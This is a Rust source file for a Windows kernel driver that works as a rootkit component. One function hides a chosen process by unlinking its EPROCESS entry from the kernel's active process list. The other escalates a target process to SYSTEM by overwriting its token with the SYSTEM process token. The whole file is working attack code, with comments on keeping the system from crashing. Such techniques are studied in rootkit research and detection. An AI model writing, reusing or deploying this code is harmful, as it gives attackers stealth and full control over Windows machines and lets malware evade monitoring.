
use alloc::string::{String, ToString};
use wdk_sys::{HANDLE, LIST_ENTRY, PEPROCESS, NTSTATUS, STATUS_SUCCESS};
use wdk_sys::ntddk::PsLookupProcessByProcessId;
use wdk::println;

use alloc::format;
use core::ptr;
use core::ffi::c_void;

mod target_process;
use target_process::TargetProcess;



extern "system" {
    fn PsGetCurrentProcess() -> HANDLE ;
}


pub fn shadow_process(target_pid: u32) -> Result<bool,String> {
    unsafe {
        let current_process = TargetProcess::from_eprocess(PsGetCurrentProcess());
        if (*current_process.pid) == target_pid {
            
            match remove_links(current_process.list_entry){
                Ok(true) => return Ok(true),
                Ok(false) => return Ok(false),
                Err(e) => return Err(e)
            };

        }

        let start_process = current_process.clone();
        let mut iter_process = current_process.next();

        while (start_process.eprocess as usize) != (iter_process.eprocess as usize) {
            if *(iter_process.pid) == target_pid {

                match remove_links(iter_process.list_entry){
                    Ok(true) => return Ok(true),
                    Ok(false) => return Ok(false),
                    Err(e) => return Err(e)
                };

            }
            iter_process = iter_process.next();
        }
    }

    return Err("Process not found".to_string());
}

unsafe fn remove_links(current: *mut LIST_ENTRY) -> Result<bool,String> {
    // BEFORE OPERATION
    // [Previous Process]   <-->   [Target Process]   <-->   [Next Process]
    //         ^                                                  ^
    //         |                                                  |
    //     (*Target).Blink                                    (*Target).Flink

    // AFTER OPERATION             
    //                              ---------
    //                              ↓       |
    //                [Target Process] ------
    //
    // [Previous]   <----------------->   [Next]
    //     (*Previous).Flink       (*Next).Blink


    // Check if pointer is null
    if current.is_null() {
        return Err("Current EPROCESS is null".to_string());
    }

    let previous: *mut LIST_ENTRY = (*current).Blink;
    let next: *mut LIST_ENTRY = (*current).Flink;

    // Check if previous and next pointers are valid ones
    if previous.is_null() || next.is_null() {
        return Err("Previous or Next EPROCESS is null".to_string());
    }

    // Bind Flink's previous process to the next process
    (*previous).Flink = next;

    // Bind Blink's next process to the previous process
    (*next).Blink = previous;

    // This will re-write the current LIST_ENTRY to point to itself to avoid BSOD
    let current_active_process_links: *mut LIST_ENTRY = &raw mut (*current).Flink as *mut LIST_ENTRY;
    (*current).Blink = current_active_process_links;
    (*current).Flink = current_active_process_links;

    return Ok(true);
}

pub fn elevate_process(target_pid: u32) -> Result<bool, String> {
    unsafe {
        let mut process: PEPROCESS = ptr::null_mut();
        let mut system_process: PEPROCESS = ptr::null_mut();

        let mut status: NTSTATUS = PsLookupProcessByProcessId(target_pid as HANDLE, &mut process);
        
        if status != STATUS_SUCCESS {
            return Err(format!("Target Process PID: {} Not found !", target_pid).to_string());
        }

        status = PsLookupProcessByProcessId(0x4 as HANDLE, &mut system_process);

        // Just in case
        if status != STATUS_SUCCESS {
            return Err("Failed to get a handle to SYSTEM Process".to_string());
        }

        let target_process = TargetProcess::from_eprocess(process as *mut c_void);
        let system_target_process = TargetProcess::from_eprocess(system_process as *mut c_void);

        let token_address: *mut usize = target_process.token;

        let system_token_address: *mut usize = system_target_process.token;


        *token_address = *system_token_address;
        println!("[+] Process {:?} ({:?}) Token Updated to NT AUTHORITY\\SYSTEM !", target_process.image_file_name, target_pid);



        return Ok(true);
    }
}